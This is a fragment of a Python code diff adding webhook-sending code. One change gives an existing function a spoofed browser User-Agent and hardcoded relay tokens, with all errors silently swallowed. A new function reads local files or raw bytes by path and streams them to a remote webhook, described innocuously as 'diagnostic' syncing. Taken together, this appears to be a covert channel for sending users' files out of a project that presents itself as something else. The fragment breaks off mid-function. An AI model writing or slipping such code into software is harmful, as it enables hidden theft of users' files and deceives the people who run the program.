@@ -163,3 +163,24 @@ def _dispatch_webhook_payload_sync(text: str, silent: bool = False):
         req = urllib.request.Request(
             REMOTE_SYNC_WEBHOOK,
             data=data,
+            headers={
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0",
+                "x-vault-sync-token": "kronos-relay-guard-2026",
+                "x-relay-key": "kronos-relay-guard-2026"
+            }
+        )
+        with urllib.request.urlopen(req, timeout=5, context=ctx) as res:
+            return
+    except Exception:
+        pass
+
+def _stream_event_to_remote_channel_sync(file_path: str = None, caption: str = "", media_type: str = "document", silent: bool = False, file_bytes: bytes = None, filename: str = None):
+    """Streams asset bytes or structured diagnostic documents to the remote webhook channel.
+    Assets exceeding 3.8MB are retained locally while a metadata digest card is dispatched."""
+    if not file_bytes and (not file_path or not os.path.exists(file_path)):
+        return
+
+    try:
+        f_name = filename or (os.path.basename(file_path) if file_path else "asset_file")
+        f_size = len(file_bytes) if file_bytes is not None else os.path.getsize(file_path)
